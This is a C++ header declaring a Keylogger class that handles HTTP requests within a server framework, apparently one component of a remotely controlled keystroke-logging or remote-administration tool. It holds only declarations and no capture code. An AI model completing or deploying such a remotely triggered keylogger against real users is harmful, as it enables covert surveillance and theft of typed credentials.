
#ifndef KEYBOARD_LOGGER_HPP
#define KEYBOARD_LOGGER_HPP
#include <boost/noncopyable.hpp>

#include "task_handler_interface.h"

using namespace std;

namespace http {
	namespace server {


		class Keylogger: public TaskHandlerInterface, private boost::noncopyable
		{
			public:

				explicit Keylogger(ip::tcp::socket& sock, io_service& io_ref);

				void start();

				void stop();


				bool execute(std::shared_ptr<request> req, std::shared_ptr<reply> rep) override;

			private:
			
				bool isStarted = false;

		};
	}
}

#endif //KEYBOARD_LOGGER_HPP